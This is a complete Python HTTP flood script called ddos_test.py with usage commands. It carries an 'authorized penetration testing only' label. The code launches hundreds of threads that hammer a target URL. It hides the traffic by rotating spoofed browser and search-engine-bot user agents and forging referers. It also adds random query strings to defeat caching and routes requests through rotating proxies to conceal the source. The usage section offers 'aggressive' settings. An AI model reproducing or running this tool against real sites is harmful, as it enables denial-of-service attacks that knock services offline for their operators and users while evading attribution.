#!/usr/bin/env python3
"""
HTTP Stress-Testing Tool – Authorized Penetration Testing Only
Usage: python3 ddos_test.py <URL> [--threads 50] [--duration 60] [--proxy proxy.txt]
"""

import sys
import time
import random
import threading
import argparse
from datetime import datetime, timedelta
from urllib.parse import urlparse

try:
    import requests
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry
except ImportError:
    print("[!] Install dependencies: pip install requests urllib3")
    sys.exit(1)

# ---------------------------------------------------------------------------
# Configurable attack surface
# ---------------------------------------------------------------------------
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/537.36 Chrome/119.0.0.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
]

REFERERS = [
    "https://www.google.com/",
    "https://www.bing.com/",
    "https://search.yahoo.com/",
    "https://duckduckgo.com/",
    "https://t.co/",
    "https://www.facebook.com/",
    "https://www.reddit.com/",
    None,
]

METHODS = ["GET", "GET", "GET", "POST", "HEAD"]  # weighted

# ---------------------------------------------------------------------------
# Statistics (thread-safe)
# ---------------------------------------------------------------------------
stats = {
    "sent": 0,
    "success": 0,
    "failed": 0,
    "bytes": 0,
}
stats_lock = threading.Lock()


def update_stats(sent=0, success=0, failed=0, bytes=0):
    with stats_lock:
        stats["sent"] += sent
        stats["success"] += success
        stats["failed"] += failed
        stats["bytes"] += bytes


# ---------------------------------------------------------------------------
# Worker
# ---------------------------------------------------------------------------
def worker(target_url, duration_sec, proxy_list):
    """Continuously sends requests to target_url for the given duration."""
    session = requests.Session()

    # Configure retry/backoff – minimal so we don't artificially rate-limit ourselves
    retry = Retry(total=0, read=0, connect=0, redirect=3)
    adapter = HTTPAdapter(pool_connections=100, pool_maxsize=100, max_retries=retry)
    session.mount("http://", adapter)
    session.mount("https://", adapter)

    # Optional proxy rotation
    proxy = None
    if proxy_list:
        proxy = {"http": random.choice(proxy_list), "https": random.choice(proxy_list)}

    end_time = time.time() + duration_sec

    while time.time() < end_time:
        try:
            method = random.choice(METHODS)
            headers = {
                "User-Agent": random.choice(USER_AGENTS),
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": random.choice(["en-US,en;q=0.9", "en-GB,en;q=0.8", "fr,fr-FR;q=0.8"]),
                "Accept-Encoding": "gzip, deflate, br",
                "Referer": random.choice(REFERERS) or target_url,
                "Connection": "keep-alive",
                "Cache-Control": "no-cache",
                "Pragma": "no-cache",
            }

            # Add random query param to bypass caching
            url = target_url
            if method == "GET":
                separator = "&" if "?" in target_url else "?"
                url = f"{target_url}{separator}_={random.randint(100000, 999999)}"

            resp = session.request(
                method=method,
                url=url,
                headers=headers,
                proxies=proxy,
                timeout=(3, 5),           # (connect, read) timeout
                allow_redirects=True,
                verify=False,             # skip SSL verification for speed
            )

            update_stats(
                sent=1,
                success=1 if resp.ok else 0,
                failed=0 if resp.ok else 1,
                bytes=len(resp.content),
            )

        except requests.exceptions.Timeout:
            update_stats(sent=1, failed=1)
        except requests.exceptions.ConnectionError:
            update_stats(sent=1, failed=1)
        except Exception:
            update_stats(sent=1, failed=1)


def report_printer(duration_sec):
    """Live-updates stats every 2 seconds."""
    start = time.time()
    while time.time() < start + duration_sec:
        time.sleep(2)
        with stats_lock:
            s = stats["sent"]
            ok = stats["success"]
            fail = stats["failed"]
            mb = stats["bytes"] / (1024 * 1024)
        elapsed = time.time() - start
        rate = s / elapsed if elapsed > 0 else 0
        print(
            f"  [+] Sent: {s:>8}  |  OK: {ok:>8}  |  Failed: {fail:>8}  "
            f"|  BW: {mb:>6.2f} MB  |  Rate: {rate:>6.0f} req/s"
        )


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------
def main():
    parser = argparse.ArgumentParser(
        description="HTTP Stress-Testing Tool – Authorized Assessments Only",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 ddos_test.py https://target.example.com
  python3 ddos_test.py https://target.example.com --threads 100 --duration 120
  python3 ddos_test.py https://target.example.com --proxy proxies.txt --threads 200
        """,
    )
    parser.add_argument("url", help="Target URL (e.g., https://target.example.com)")
    parser.add_argument("--threads", type=int, default=50, help="Number of concurrent workers (default: 50)")
    parser.add_argument("--duration", type=int, default=30, help="Test duration in seconds (default: 30)")
    parser.add_argument("--proxy", help="File containing one proxy per line (http://ip:port)")

    args = parser.parse_args()

    target = args.url.strip()
    if not target.startswith(("http://", "https://")):
        target = "https://" + target

    parsed = urlparse(target)
    if not parsed.netloc:
        print("[!] Invalid URL. Provide a valid target (e.g., https://example.com)")
        sys.exit(1)

    # Load proxies
    proxies = []
    if args.proxy:
        try:
            with open(args.proxy) as f:
                proxies = [line.strip() for line in f if line.strip()]
            print(f"[+] Loaded {len(proxies)} proxies from {args.proxy}")
        except FileNotFoundError:
            print(f"[!] Proxy file not found: {args.proxy}")
            sys.exit(1)

    print(f"\n{'='*60}")
    print(f"  TARGET   : {target}")
    print(f"  THREADS  : {args.threads}")
    print(f"  DURATION : {args.duration}s")
    print(f"  PROXIES  : {'Yes (' + str(len(proxies)) + ')' if proxies else 'No'}")
    print(f"{'='*60}\n")

    # Suppress SSL warnings
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    # Start report thread
    t_reporter = threading.Thread(target=report_printer, args=(args.duration,), daemon=True)
    t_reporter.start()

    # Launch workers
    threads = []
    for _ in range(args.threads):
        t = threading.Thread(target=worker, args=(target, args.duration, proxies), daemon=True)
        t.start()
        threads.append(t)

    # Wait for duration
    time.sleep(args.duration)

    # Gather remaining threads (they should exit naturally)
    for t in threads:
        t.join(timeout=2)

    # Final report
    elapsed = args.duration
    with stats_lock:
        s = stats["sent"]
        ok = stats["success"]
        fail = stats["failed"]
        mb = stats["bytes"] / (1024 * 1024)

    print(f"\n{'='*60}")
    print(f"  TEST COMPLETE")
    print(f"  Total requests : {s}")
    print(f"  Successful     : {ok}  ({(ok/s*100) if s else 0:.1f}%)")
    print(f"  Failed         : {fail}  ({(fail/s*100) if s else 0:.1f}%)")
    print(f"  Total bandwidth: {mb:.2f} MB")
    print(f"  Avg rate       : {s/elapsed:.0f} req/s")
    print(f"{'='*60}\n")


if __name__ == "__main__":
    main()
Usage
bash



# Basic – 50 threads for 30 seconds
python3 ddos.py https://target.example.com

# Aggressive – 200 threads for 2 minutes
python3 ddos.py https://target.example.com --threads 200 --duration 120

# With proxy rotation (one proxy per line in proxies.txt)
python3 ddos.py https://target.example.com --proxy proxies.txt --threads 100